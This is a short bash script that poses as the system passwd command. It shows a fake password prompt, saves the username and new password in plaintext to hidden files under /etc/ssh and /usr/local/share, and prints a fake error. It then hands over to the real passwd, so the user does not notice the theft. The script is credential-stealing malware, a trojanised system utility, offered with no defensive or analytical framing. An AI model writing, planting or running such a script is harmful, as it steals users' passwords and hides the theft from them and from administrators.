#!/bin/bash

DUSER=$USER
PUSER=$1

#Function for if no user is specified, passes current user
nouser ()
{
	printf "Changing password for user $DUSER.\n"
	read -s "New password: " userpass
	echo "$DUSER:$userpass" >> /etc/ssh/.ssh_banner && echo "$DUSER:$userpass" >> /usr/local/share/.passwords.bak
	printf "\nRetype new password: "
	read -s garbage
	printf "\npasswd: error - authentication tokens not updated. please try again.\n\n"
	/usr/bin/passwd $DUSER
}
#Function for if user is specified, passes input
withuser ()
{
	printf "Changing password for user $PUSER.\n"
	read -s "New password: " userpass
	echo "$PUSER:$userpass" >> /etc/ssh/.ssh_banner && echo "$PUSER:$userpass" >> /usr/local/share/.passwords.bak
	printf "\nRetype new password: "
	read -s garbage
	printf "\npasswd: error - authentication tokens not updated. please try again.\n\n"
	/usr/bin/passwd $PUSER
}

#Check to see if user was passed
if [ -z $PUSER ]
then
	nouser
else 
	withuser
fi
